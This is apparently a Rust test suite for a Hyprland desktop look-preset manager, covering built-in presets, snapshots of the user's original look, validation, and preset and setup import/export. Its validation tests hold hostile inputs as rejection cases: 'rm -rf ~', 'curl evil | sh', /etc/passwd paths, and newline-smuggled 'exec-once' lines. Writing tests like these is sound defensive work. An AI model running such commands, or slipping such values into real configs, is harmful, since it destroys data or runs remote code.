mod common;

use std::fs;

use common::{app_data, s, strings, TempConfig};
use hyprmod_core::lua::list_calls;
use hyprmod_core::presets::{
    normalize_value, LIST_KEYWORDS, LOOK_KEYS, MAX_FILE_BYTES, ORIGINAL_ID, ORIGINAL_MARKER, PRESET_EXT, SETUP_EXT,
};
use hyprmod_core::values::color_to_rgba_tuple;
use hyprmod_core::{parse_value, ConfigManager, Preset, PresetStore, Value};
use serde_json::{json, Value as Json};

fn doc(over: Json) -> Json {
    let mut data = json!({"format": "hyprland-mod-preset", "version": 1, "id": "test", "name": "Test",
        "author": "me", "description": "A test", "tags": ["dark"],
        "settings": {"general:gaps_in": "3", "decoration:blur:enabled": "false"},
        "lists": {"bezier": ["snappy, 0.2, 1, 0.3, 1"], "animation": ["windows, 1, 3, snappy, popin 80%"]}});
    for (k, v) in over.as_object().unwrap() {
        data[k] = v.clone();
    }
    data
}

fn store(cm: &ConfigManager) -> PresetStore {
    PresetStore::new(&app_data(), cm.data_dir())
}

fn builtin(st: &PresetStore, id: &str) -> Preset {
    st.load_builtin().unwrap().into_iter().find(|p| p.id == id).unwrap()
}

// ------------------------------------------------------------ built-in presets

#[test]
fn distinct_valid_presets() {
    let t = TempConfig::conf();
    let cm = t.make();
    let st = store(&cm);
    let all = st.load_builtin().unwrap();
    let n = all.len();
    assert!(n >= 32, "{n}");
    let ids: std::collections::BTreeSet<_> = all.iter().map(|p| p.id.clone()).collect();
    let names: std::collections::BTreeSet<_> = all.iter().map(|p| p.name.clone()).collect();
    let looks: std::collections::BTreeSet<_> = all
        .iter()
        .map(|p| {
            let mut v: Vec<_> = p.settings.iter().collect();
            v.sort();
            format!("{v:?}")
        })
        .collect();
    assert_eq!((ids.len(), names.len(), looks.len()), (n, n, n));
    for p in &all {
        assert!(p.builtin && !p.name.is_empty() && !p.description.is_empty() && !p.tags.is_empty(), "{}", p.id);
        let keys: std::collections::BTreeSet<&str> = p.settings.keys().map(String::as_str).collect();
        assert_eq!(keys, LOOK_KEYS.iter().copied().collect(), "{}", p.id);
        for (key, value) in &p.settings {
            let opt = &st.options[key];
            assert_ne!(parse_value(opt, Some(value)), Value::Null);
            assert_eq!(&normalize_value(key, &json!(value), opt, &st.options).unwrap(), value, "{} {key}", p.id);
        }
        // re-validating the raw file gives the same thing, and Lua can express the lists
        let raw: Json = serde_json::from_str(&fs::read_to_string(p.path.as_ref().unwrap()).unwrap()).unwrap();
        assert_eq!(st.validate_preset(&raw).unwrap().settings, p.settings);
        for (kw, values) in &p.lists {
            assert_eq!(list_calls(kw, values).unwrap().len(), values.len());
        }
        assert!(p.lists.get("animation").is_some_and(|a| !a.is_empty()));
    }
    // sorted by "order"
    assert_eq!(all[0].id, "clean");
}

#[test]
fn no_purple_dominant_border() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    for p in st.load_builtin().unwrap() {
        let first = p.settings["general:col.active_border"].split_whitespace().next().unwrap().to_string();
        let (r, g, b, _) = color_to_rgba_tuple(&first).unwrap();
        let (r, g, b) = (r as i32, g as i32, b as i32);
        assert!(!(b > g + 40 && r > g + 40), "{} active border is purple", p.id);
    }
}

#[test]
fn stage_shows_in_manager_and_discard_reverts() {
    let t = TempConfig::conf();
    let mut cm = t.make();
    let st = store(&cm);
    let nord = builtin(&st, "nord");
    assert!(!nord.matches(&cm, &st.options));
    st.stage_preset(&mut cm, &nord).unwrap();
    assert!(cm.is_dirty());
    assert!(nord.matches(&cm, &st.options));
    assert_eq!(cm.get("general:col.active_border"), Some(nord.settings["general:col.active_border"].clone()));
    assert_eq!(cm.get_list("animation"), nord.lists["animation"]);
    cm.discard();
    assert!(!nord.matches(&cm, &st.options));
    assert_eq!(cm.get("general:gaps_out").as_deref(), Some("10"));
}

#[test]
fn apply_writes_managed_file() {
    let t = TempConfig::conf();
    let mut cm = t.make();
    let st = store(&cm);
    let retro = builtin(&st, "retro");
    st.stage_preset(&mut cm, &retro).unwrap();
    let res = cm.apply();
    assert!(res.ok, "{:?}", res.errors);
    let text = t.managed_text();
    assert!(text.contains("border_size = 4"));
    assert!(text.contains("bezier = linear, 0, 0, 1, 1"));
    assert!(retro.matches(&cm, &st.options));
}

#[test]
fn every_builtin_validates_and_stages() {
    let t = TempConfig::conf();
    let mut cm = t.make();
    let st = store(&cm);
    for p in st.load_builtin().unwrap() {
        st.stage_preset(&mut cm, &p).unwrap();
        assert!(p.matches(&cm, &st.options), "{}", p.id);
    }
    cm.discard();
}

#[test]
fn every_builtin_stages_in_lua_mode() {
    let t = TempConfig::lua();
    let mut cm = t.make();
    let st = store(&cm);
    let all = st.load_builtin().unwrap();
    st.stage_preset(&mut cm, &all[3]).unwrap();
    assert!(cm.apply().ok);
    common::assert_luac_ok(&t.managed);
}

// ------------------------------------------------------------ "My original look"

#[test]
fn snapshot_created_once_on_first_launch() {
    let t = TempConfig::conf();
    let mut cm = t.make();
    let st = store(&cm);
    let marker = t.data.join(ORIGINAL_MARKER);
    assert!(!marker.exists());
    let orig = st.ensure_original(&cm).unwrap();
    assert!(marker.exists());
    assert!(orig.original());
    assert_eq!(
        (orig.name.as_str(), orig.description.as_str()),
        ("My original look", "Your setup from before Hyprland Mod")
    );
    assert_eq!(orig.settings["general:gaps_out"], "10");
    // a second launch, even after the look changed, keeps the first snapshot
    cm.set("general:gaps_out", s("40")).unwrap();
    let again = st.ensure_original(&cm).unwrap();
    assert_eq!(again.settings["general:gaps_out"], "10");
    let count = fs::read_dir(&st.user_dir)
        .unwrap()
        .filter(|e| e.as_ref().unwrap().file_name().to_string_lossy().starts_with("my-original-look"))
        .count();
    assert_eq!(count, 1);
    let (user, _) = st.load_user();
    assert_eq!(user.iter().filter(|p| p.original()).map(|p| p.id.as_str()).collect::<Vec<_>>(), [ORIGINAL_ID]);
}

#[test]
fn staging_a_preset_makes_sure_snapshot_exists_first() {
    let t = TempConfig::conf();
    let mut cm = t.make();
    let st = store(&cm);
    st.stage_preset(&mut cm, &builtin(&st, "nord")).unwrap();
    let orig = st.load_original().unwrap();
    assert_eq!(orig.settings["general:gaps_out"], "10"); // not nord's 12
}

#[test]
fn snapshot_ignores_hyprland_mod_overrides() {
    let t = TempConfig::conf();
    let mut cm = t.make();
    let st = store(&cm);
    st.stage_preset(&mut cm, &builtin(&st, "retro")).unwrap();
    assert!(cm.apply().ok);
    fs::remove_file(t.data.join(ORIGINAL_MARKER)).unwrap();
    fs::remove_file(st.original_path()).unwrap();
    let orig = st.ensure_original(&cm).unwrap();
    assert_eq!(orig.settings["general:gaps_out"], "10");
}

#[test]
fn original_not_deletable_but_renamable() {
    let t = TempConfig::conf();
    let cm = t.make();
    let st = store(&cm);
    let mut orig = st.ensure_original(&cm).unwrap();
    assert!(st.delete_user(&orig).is_err());
    assert!(orig.path.as_ref().unwrap().exists());
    st.rename_user(&mut orig, "Home setup").unwrap();
    let again = st.load_original().unwrap();
    assert_eq!(again.name, "Home setup");
    assert!(again.original());
}

#[test]
fn imports_cannot_take_the_original_id() {
    let t = TempConfig::conf();
    let cm = t.make();
    let st = store(&cm);
    st.ensure_original(&cm);
    let src = t.tmp.path().join("x.hyprmod-preset");
    fs::write(&src, doc(json!({"id": "my-original-look"})).to_string()).unwrap();
    let imported = st.import_preset(&src).unwrap();
    assert!(!imported.original());
}

#[test]
fn back_to_original_resets_all_preset_managed_keys() {
    let t = TempConfig::conf();
    let mut cm = t.make();
    let st = store(&cm);
    st.ensure_original(&cm);
    for id in ["retro", "bubbly"] {
        st.stage_preset(&mut cm, &builtin(&st, id)).unwrap();
    }
    assert!(cm.apply().ok);
    assert!(st.has_overrides(&cm));
    st.restore_original(&mut cm);
    assert!(cm.apply().ok);
    assert!(!st.has_overrides(&cm));
    for key in st.managed_look_keys() {
        assert!(!cm.is_modified(&key), "{key}");
    }
    for kw in LIST_KEYWORDS {
        assert!(!cm.is_list_modified(kw));
    }
    assert_eq!(cm.get("general:gaps_out").as_deref(), Some("10"));
    assert!(st.load_original().unwrap().matches(&cm, &st.options));
}

#[test]
fn page_init_work_stages_nothing() {
    let t = TempConfig::conf();
    let cm = t.make();
    let st = store(&cm);
    st.ensure_original(&cm);
    st.load_user();
    assert!(!st.has_overrides(&cm));
    assert!(cm.pending().is_empty());
    assert!(!cm.is_dirty());
}

// ------------------------------------------------------------ validation

fn rejected(st: &PresetStore, data: Json, fragment: &str) -> String {
    let e = st.validate_preset(&data).expect_err("should be rejected").to_string();
    assert!(e.contains(fragment), "{e:?} does not contain {fragment:?}");
    e
}

#[test]
fn valid_and_normalized() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    let p = st
        .validate_preset(&doc(json!({"settings": {"decoration:blur:enabled": true, "general:gaps_in": 4,
        "general:col.active_border": "rgb(ff0000)  rgba(00ff00ff) 45deg", "decoration:active_opacity": 0.9}})))
        .unwrap();
    assert_eq!(p.settings["decoration:blur:enabled"], "true");
    assert_eq!(p.settings["general:gaps_in"], "4");
    assert_eq!(p.settings["decoration:active_opacity"], "0.9");
    assert_eq!(p.settings["general:col.active_border"], "rgba(ff0000ff) rgba(00ff00ff) 45deg");
}

#[test]
fn rejects_wrong_format() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    rejected(&st, json!([]), "isn't a Hyprland Mod preset");
    rejected(&st, doc(json!({"format": "something-else"})), "");
    rejected(&st, doc(json!({"format": "hyprland-mod-setup"})), "Import & Export");
    rejected(&st, doc(json!({"version": 99})), "newer version");
    rejected(&st, doc(json!({"version": 1.0})), "newer version");
    rejected(&st, doc(json!({"name": ""})), "no name");
    rejected(&st, doc(json!({"settings": {}, "lists": {}})), "doesn't change anything");
}

#[test]
fn rejects_unknown_and_unsafe_keys() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    rejected(&st, doc(json!({"settings": {"general:not_a_thing": "1"}})), "isn't a setting");
    rejected(&st, doc(json!({"settings": {"exec-once": "rm -rf ~"}})), "run commands");
    rejected(&st, doc(json!({"settings": {"input:kb_file": "/etc/passwd"}})), "only change the look");
    rejected(&st, doc(json!({"settings": {"decoration:screen_shader": "/tmp/x.frag"}})), "only change the look");
    rejected(&st, doc(json!({"settings": {"source": "~/evil.conf"}})), "");
    rejected(&st, doc(json!({"lists": {"exec-once": ["curl evil | sh"]}})), "run commands");
    rejected(&st, doc(json!({"lists": {"bind": ["SUPER, Q, exec, kitty"]}})), "run commands");
    rejected(&st, doc(json!({"lists": {"monitor": [",preferred,auto,1"]}})), "aren't allowed");
}

#[test]
fn rejects_bad_values() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    rejected(&st, doc(json!({"settings": {"general:gaps_in": "lots"}})), "invalid value");
    let e = rejected(&st, doc(json!({"settings": {"general:gaps_in": "500"}})), "between");
    assert!(e.ends_with("must be between 0 and 100 (got 500)."), "{e}");
    let e = rejected(&st, doc(json!({"settings": {"decoration:active_opacity": "5"}})), "between");
    assert_eq!(e, "“Active window opacity” must be between 0.0 and 1.0 (got 5)."); // same text as Python
    rejected(&st, doc(json!({"settings": {"decoration:blur:enabled": "maybe"}})), "");
    rejected(&st, doc(json!({"settings": {"general:col.active_border": "red; exec foo"}})), "");
    rejected(&st, doc(json!({"settings": {"general:col.active_border": "rgba(ff0000ff)\nexec-once = x"}})), "");
    rejected(&st, doc(json!({"settings": {"decoration:shadow:color": "rgba(zzzzzzzz)"}})), "");
    rejected(&st, doc(json!({"settings": {"general:gaps_in": {"nested": 1}}})), "can't understand");
    rejected(&st, doc(json!({"settings": {"decoration:rounding": "1}"}})), "");
}

#[test]
fn rejects_bad_lists() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    rejected(&st, doc(json!({"lists": {"animation": ["windows, 1, 3, undefinedCurve"]}})), "doesn't define");
    rejected(&st, doc(json!({"lists": {"animation": ["notALeaf, 1, 3, default"]}})), "");
    rejected(&st, doc(json!({"lists": {"animation": ["windows, 1, 3, default, exec kitty"]}})), "");
    rejected(&st, doc(json!({"lists": {"bezier": ["x, 0, 0, 1"]}})), "");
    rejected(&st, doc(json!({"lists": {"bezier": ["x, 5, 0, 1, 1"]}})), "out of range");
    rejected(&st, doc(json!({"lists": {"bezier": "not a list"}})), "");
    let ok = st.validate_preset(&doc(json!({"lists": {"animation": ["border, 0", "fade, 1, 2, default"]}}))).unwrap();
    assert_eq!(ok.lists["animation"], ["border, 0", "fade, 1, 2, default"]);
}

#[test]
fn rejects_bad_metadata() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    rejected(&st, doc(json!({"name": "x".repeat(200)})), "too long");
    rejected(&st, doc(json!({"tags": "dark"})), "tags");
    rejected(&st, doc(json!({"description": "bad\u{07}bell"})), "control characters");
}

#[test]
fn bad_id_is_replaced() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    let p = st.validate_preset(&doc(json!({"id": "../../etc/passwd", "name": "My Look!"}))).unwrap();
    assert_eq!(p.id, "my-look");
}

#[test]
fn damaged_and_huge_files() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    let path = t.tmp.path().join("bad.hyprmod-preset");
    fs::write(&path, "{not json").unwrap();
    assert!(st.read_preset_file(&path).is_err());
    fs::write(&path, " ".repeat(MAX_FILE_BYTES as usize + 1)).unwrap();
    assert!(st.read_preset_file(&path).unwrap_err().to_string().contains("too large"));
}

// ------------------------------------------------------------ user presets

#[test]
fn save_load_rename_delete() {
    let t = TempConfig::conf();
    let cm = t.make();
    let st = store(&cm);
    assert_eq!(st.load_user(), (vec![], vec![]));
    let mut p = st.capture(&cm, "My Look", "mine", "").unwrap();
    assert_eq!(p.settings["general:gaps_out"], "10");
    assert_eq!(p.lists["bezier"], ["easeOutQuint, 0.23, 1, 0.32, 1", "linear, 0, 0, 1, 1"]);
    st.save_user(&mut p).unwrap();
    assert!(p.path.as_ref().unwrap().starts_with(t.data.join("presets")));
    let mut again = st.capture(&cm, "My Look", "", "").unwrap();
    st.save_user(&mut again).unwrap();
    assert_ne!(p.id, again.id);
    let (mut loaded, problems) = st.load_user();
    assert!(problems.is_empty());
    assert_eq!(loaded.iter().map(|x| x.name.as_str()).collect::<Vec<_>>(), ["My Look", "My Look"]);
    assert_eq!(loaded[0].settings, p.settings);
    st.rename_user(&mut loaded[0], "Renamed").unwrap();
    assert!(st.load_user().0.iter().any(|x| x.name == "Renamed"));
    st.delete_user(&loaded[0]).unwrap();
    st.delete_user(&loaded[1]).unwrap();
    assert!(st.load_user().0.is_empty());
}

#[test]
fn saved_id_never_shadows_builtin() {
    let t = TempConfig::conf();
    let cm = t.make();
    let st = store(&cm);
    let mut p = st.capture(&cm, "Nord", "", "").unwrap();
    st.save_user(&mut p).unwrap();
    assert_eq!(p.id, "nord-2");
}

#[test]
fn delete_refuses_outside_files() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    let outside = t.tmp.path().join("keep.json");
    fs::write(&outside, "{}").unwrap();
    let p = Preset { id: s("x"), name: s("x"), path: Some(outside.clone()), ..Default::default() };
    assert!(st.delete_user(&p).is_err());
    assert!(outside.exists());
    assert!(st.delete_user(&st.load_builtin().unwrap()[0]).is_err());
}

#[test]
fn damaged_user_file_is_skipped() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    fs::create_dir_all(&st.user_dir).unwrap();
    fs::write(st.user_dir.join("broken.json"), doc(json!({"settings": {"exec": "x"}})).to_string()).unwrap();
    let mut p = st.validate_preset(&doc(json!({}))).unwrap();
    st.save_user(&mut p).unwrap();
    let (loaded, problems) = st.load_user();
    assert_eq!(loaded.iter().map(|p| p.name.as_str()).collect::<Vec<_>>(), ["Test"]);
    assert_eq!(problems.len(), 1);
    assert!(problems[0].starts_with("broken.json: "));
}

#[test]
fn capture_drops_unverifiable_animation_lists() {
    let t = TempConfig::conf();
    let mut cm = t.make();
    let st = store(&cm);
    cm.set_list("animation", strings(&["windows, 1, 4, curveFromElsewhere"])).unwrap();
    cm.set_list("bezier", vec![]).unwrap();
    let p = st.capture(&cm, "Look", "", "").unwrap();
    assert!(p.lists.is_empty());
    assert!(p.settings.contains_key("general:gaps_in"));
}

#[test]
fn export_import_round_trip() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    let original = st.validate_preset(&doc(json!({}))).unwrap();
    let path = t.tmp.path().join(format!("shared{PRESET_EXT}"));
    st.export_preset(&original, &path).unwrap();
    let data: Json = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
    assert_eq!(data["format"], json!("hyprland-mod-preset"));
    let imported = st.import_preset(&path).unwrap();
    assert_eq!(imported.settings, original.settings);
    assert_eq!(imported.lists, original.lists);
    assert!(imported.path.as_ref().unwrap().is_file());
    let second = st.import_preset(&path).unwrap();
    assert_ne!(second.id, imported.id);
}

// ------------------------------------------------------------ whole setup

#[test]
fn setup_export_import_round_trip() {
    let t = TempConfig::conf();
    let mut cm = t.make();
    let st = store(&cm);
    cm.set("decoration:rounding", s("14")).unwrap();
    cm.set("general:col.active_border", s("rgba(112233ff) rgba(445566ff) 90deg")).unwrap();
    cm.set_list("bezier", strings(&["calm, 0.25, 0.1, 0.25, 1"])).unwrap();
    cm.set_list("animation", strings(&["windows, 1, 4, calm, popin 90%"])).unwrap();
    assert!(cm.apply().ok);
    let path = t.tmp.path().join(format!("setup{SETUP_EXT}"));
    st.export_setup(&cm, &path).unwrap();
    let docu: Json = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
    assert_eq!(docu["format"], json!("hyprland-mod-setup"));
    assert!(docu.get("created").is_some());
    let exported = cm.export_state();

    cm.set("decoration:rounding", s("3")).unwrap();
    cm.set("general:gaps_in", s("9")).unwrap();
    cm.reset_list("animation");
    assert!(cm.apply().ok);

    let state = st.read_setup(&path).unwrap();
    let changes = st.setup_changes(&cm, &state);
    let by_key = |k: &str| changes.iter().find(|c| c.key == k).unwrap().clone();
    assert_eq!(by_key("decoration:rounding").new.as_deref(), Some("14"));
    assert_eq!(by_key("general:gaps_in").new, None); // goes back to the user's own value
    assert_eq!(by_key("animation").new.as_deref(), Some("1 line"));
    let before = cm.list_backups().len();
    st.import_setup(&mut cm, state.clone()).unwrap();
    assert_eq!(cm.list_backups().len(), before + 1);
    assert_eq!(cm.list_backups()[0].label, "Before import");
    assert!(cm.is_dirty()); // staged, not yet written
    assert!(cm.apply().ok);
    assert_eq!(cm.export_state()["settings"], exported["settings"]);
    assert_eq!(cm.export_state()["lists"], exported["lists"]);
    assert!(st.setup_changes(&cm, &state).is_empty());
}

#[test]
fn rejects_malicious_setup() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    let d = |state: Json, fmt: &str| json!({"format": fmt, "version": 1, "state": state});
    let setup = "hyprland-mod-setup";
    let bad = [
        d(json!({"settings": {}, "lists": {"exec-once": ["curl x | sh"]}}), setup),
        d(json!({"settings": {"exec": "rm -rf ~"}, "lists": {}}), setup),
        d(json!({"settings": {"not:a:key": "1"}}), setup),
        d(json!({"settings": {"general:gaps_in": "1\nexec-once = evil"}}), setup),
        d(json!({"settings": {}, "lists": {"bind": ["SUPER, Q, exec, x"]}}), setup),
        d(json!("nope"), setup),
        d(json!({}), "hyprland-mod-preset"),
        json!({"format": "hyprland-mod-setup", "version": 7, "state": {}}),
    ];
    for b in bad {
        assert!(st.validate_setup(&b).is_err(), "{b}");
    }
}

#[test]
fn setup_allows_curves_from_users_config() {
    let t = TempConfig::conf();
    let st = store(&t.make());
    let state = st
        .validate_setup(&json!({"format": "hyprland-mod-setup", "version": 1, "state": {
            "settings": {"input:kb_layout": "us,de"}, "lists": {"animation": ["windows, 1, 4, myCurve"]}}}))
        .unwrap();
    assert_eq!(state["lists"]["animation"], json!(["windows, 1, 4, myCurve"]));
    assert_eq!(state["settings"]["input:kb_layout"], json!("us,de"));
}

#[test]
fn original_captured_in_lua_dry_run_with_schema_defaults() {
    let t = TempConfig::lua();
    let cm = t.make();
    let st = store(&cm);
    let orig = st.ensure_original(&cm).expect("original look captured");
    assert!(t.data.join(ORIGINAL_MARKER).exists());
    assert!(st.original_path().is_file());
    for key in LOOK_KEYS {
        let opt = &st.options[*key];
        let default = hyprmod_core::format_value(opt, &parse_value(opt, None)).unwrap();
        if !default.is_empty() {
            assert_eq!(orig.settings[*key], default, "{key}");
        }
    }
    assert_eq!(orig.settings["decoration:rounding"], "0");
    // the sample's animations use a spring curve presets can't express: look only, like Python
    assert!(orig.lists.is_empty());
}
